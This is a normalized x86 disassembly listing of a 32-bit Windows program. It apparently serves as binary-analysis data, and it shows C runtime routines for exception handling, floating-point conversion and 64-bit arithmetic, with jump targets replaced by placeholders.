push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_412c41
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_4124d6
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4130a0
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_410d88
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_410d88
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_4130ec
push esi
mov esi [ esp + 0x8 ]
cmp [ esi ] 0xe06d7363
jne r-xdata
pop esi
retn
cmp [ r--data ] 0x0
je r-xdata
push r--data
call sub_40f960
test eax eax
pop ecx
je r-xdata
push [ esp + 0xc ]
push esi
call [ r--data ]
pop ecx
pop ecx
sub_413120
push ebx
push ebp
mov ebp [ esp + 0xc ]
xor eax eax
or edx 0xffffffff
cmp ecx 0xffffffff
push esi
je r-xdata
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
lea ecx [ ecx + ecx * 2 ]
mov esi [ ebp + ecx * 4 + 0x8 ]
lea ebx [ ebp + ecx * 4 ]
sub esi edi
and esi 0xfffff000
cmp esi edx
je r-xdata
mov ecx [ ebx + 0x4 ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
mov ecx [ ebx ]
cmp ecx 0xffffffff
jne r-xdata
sub ecx edi
and ecx 0xfffff000
mov esi ecx
cmp esi edx
je r-xdata
push esi
push edi
call sub_40f910
add esp 0x8
test eax eax
je r-xdata
mov ecx [ eax + 0xc ]
cmp esi ecx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp esi ecx
jb r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
retn
test [ eax + 0x24 ] 0x20000000
je r-xdata
mov edx [ eax + 0x8 ]
add edx ecx
cmp esi edx
jb r-xdata
push esi
push edi
call sub_40f910
add esp 0x8
test eax eax
je r-xdata
mov edx [ eax + 0x8 ]
add edx ecx
cmp esi edx
jb r-xdata
mov edx esi
test [ eax + 0x24 ] 0x20000000
je r-xdata
mov edx esi
sub_4131e0
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_40c700
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
mov [ ebp - 0x1c ] edx
test dl 0x3
je r-xdata
mov eax [ fs : 0x18 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x20 ] ecx
cmp edx ecx
jb r-xdata
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ esi + 0xc ]
mov [ ebp - 0x24 ] edi
cmp edi 0xffffffff
je r-xdata
cmp edx [ eax + 0x4 ]
jb r-xdata
mov eax 0x1
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
xor eax eax
mov ecx edx
nop
cmp [ ecx + 0x4 ] 0x0
je r-xdata
cmp esi eax
jae r-xdata
add eax 0x1
add ecx 0xc
cmp eax edi
jbe r-xdata
mov ebx 0x1
mov esi [ ecx ]
cmp esi 0xffffffff
je r-xdata
test ebx ebx
je r-xdata
mov eax edx
and eax 0xfffff000
mov [ ebp - 0x20 ] eax
xor esi esi
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx - 0x8 ]
cmp eax [ ebp - 0x20 ]
jb r-xdata
push 0x1c
lea eax [ ebp - 0x40 ]
push eax
push edx
call [ VirtualQuery@IAT ]
test eax eax
je r-xdata
mov ebx [ esi * 8 + rw-data ]
mov edi [ esi * 8 + rw-data ]
cmp ebx [ ebp - 0x20 ]
jne r-xdata
cmp eax ecx
jae r-xdata
mov eax [ ebp - 0x28 ]
cmp eax 0x1000000
je r-xdata
add esi 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
push edi
call sub_40f8e0
add esp 0x4
test eax eax
je r-xdata
mov edi [ ebp - 0x3c ]
push edi
call sub_40f8e0
add esp 0x4
test eax eax
je r-xdata
cmp eax 0x20000
jne r-xdata
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x24 ]
call sub_413120
add esp 0x4
test eax eax
je r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test [ ebp - 0x2c ] 0xcc
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
sub edx edi
push edx
push edi
call sub_40f910
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp - 0x1c ]
push edx
mov ecx [ ebp - 0x24 ]
call sub_413120
add esp 0x4
test eax eax
je r-xdata
mov ecx [ ebp - 0x1c ]
sub ecx edi
push ecx
push edi
call sub_40f910
add esp 0x8
test eax eax
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
mov [ rw-data ] 0x94
push rw-data
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
test esi esi
jle r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
sub ecx edi
push ecx
push edi
call sub_40f910
add esp 0x8
test eax eax
je r-xdata
test [ eax + 0x24 ] 0x80000000
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov eax 0x1
mov ecx rw-data
xchg [ ecx ] eax
test eax eax
jne r-xdata
mov edx 0x1
mov eax rw-data
xchg [ eax ] edx
test edx edx
jne r-xdata
mov eax [ ebp - 0x20 ]
cmp [ esi * 8 + rw-data ] eax
je r-xdata
mov esi [ rw-data ]
mov eax esi
mov ecx [ ebp - 0x20 ]
test esi esi
jle r-xdata
test esi esi
mov ecx [ rw-data ]
lea esi [ ecx - 0x1 ]
test esi esi
jl r-xdata
test eax eax
jne r-xdata
lea edx [ esi * 8 + rw-data ]
mov eax rw-data
xor edx edx
xchg [ eax ] edx
xor eax eax
test esi esi
jl r-xdata
cmp ecx 0x10
jge r-xdata
jmp r-xdata
mov ecx [ ebp - 0x3c ]
mov [ eax * 8 + rw-data ] ecx
cmp esi 0xf
jle r-xdata
sub eax 0x1
sub edx 0x8
test eax eax
jg r-xdata
jmp r-xdata
lea esi [ ecx - 0x1 ]
add ecx 0x1
mov [ rw-data ] ecx
cmp [ esi * 8 + rw-data ] eax
je r-xdata
mov edx [ ebp - 0x3c ]
test esi esi
jl r-xdata
mov esi 0xf
cmp [ edx ] ecx
je r-xdata
mov ecx [ eax * 8 + rw-data ]
mov edx [ eax * 8 + rw-data ]
mov [ eax * 8 + rw-data ] ebx
mov [ eax * 8 + rw-data ] edi
mov ebx ecx
mov edi edx
add eax 0x1
cmp eax esi
jle r-xdata
mov ebx [ esi * 8 + rw-data ]
mov edi [ esi * 8 + rw-data ]
sub esi 0x1
jns r-xdata
cmp [ rw-data ] 0x10
jge r-xdata
mov eax rw-data
lea ebx [ esi + 0x1 ]
jmp r-xdata
jle r-xdata
jmp r-xdata
add [ rw-data ] 0x1
jmp r-xdata
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov ecx esi
mov edx edi
add eax 0x8
sub ebx 0x1
jne r-xdata
test esi esi
jge r-xdata
sub_413590
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_4135bd
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_40b00b
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_414540
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_413abc
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40fd18
leave
retn
sub_413663
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_40b00b
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_414540
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_413ffe
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40fd18
leave
retn
sub_413709
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
push edi
mov edi [ ecx + 0xc ]
jne r-xdata
cmp [ ebp + 0xc ] ebx
jbe r-xdata
call sub_40d694
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
cmp edx ebx
mov [ esi ] bl
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov eax edx
jmp r-xdata
cmp edx ebx
mov [ esi ] 0x30
lea eax [ esi + 0x1 ]
jle r-xdata
call sub_40d694
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
cmp edx ebx
mov [ eax ] bl
jl r-xdata
mov cl [ edi ]
cmp cl bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40f5bf
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc edi
jmp r-xdata
lea edi [ esi + 0x1 ]
push edi
call sub_40dab0
inc eax
push eax
push edi
push esi
call sub_40ab70
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
cmp edx ebx
jg r-xdata
xor eax eax
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_4137c6
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x6 ]
push ebx
mov ecx eax
push esi
push edi
shr ecx 0x4
and eax 0x8000
mov edi 0x7ff
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
test ebx ebx
mov [ ebp - 0x4 ] esi
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
add ecx 0x3c01
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ecx 0x3c00
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx ecx
add edx edx
shr ebx 0x1f
or edx ebx
add ecx ecx
add edi 0xffff
test esi edx
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
or ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl edx 0xb
test esi ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
jne r-xdata
movzx edi cx
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_413881
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x30 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4137c6
pop ecx
pop ecx
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x10 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_414c00
mov esi [ ebp - 0x30 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x2a ]
mov [ ebx ] eax
movsx eax [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_40d92c
add esp 0x24
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_40fd18
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40f4c3
add esp 0x14
sub_413910
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_4139f0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_413a0f
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
test ecx 0xfcf0fce0
push esi
je r-xdata
mov esi [ ebp + 0x8 ]
test esi esi
push eax
push [ ebp + 0xc ]
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
je r-xdata
call sub_4155f4
call sub_4155f4
mov [ esi ] eax
jmp r-xdata
call sub_40d694
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_40f5bf
add esp 0x14
mov eax edi
pop edi
jmp r-xdata
push esi
push esi
call sub_4155f4
pop ecx
pop ecx
mov [ edi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_413a79
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_413abc
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
cmp ebx 0xffffc001
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
cmp esi edx
mov [ ebp + 0x8 ] esi
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
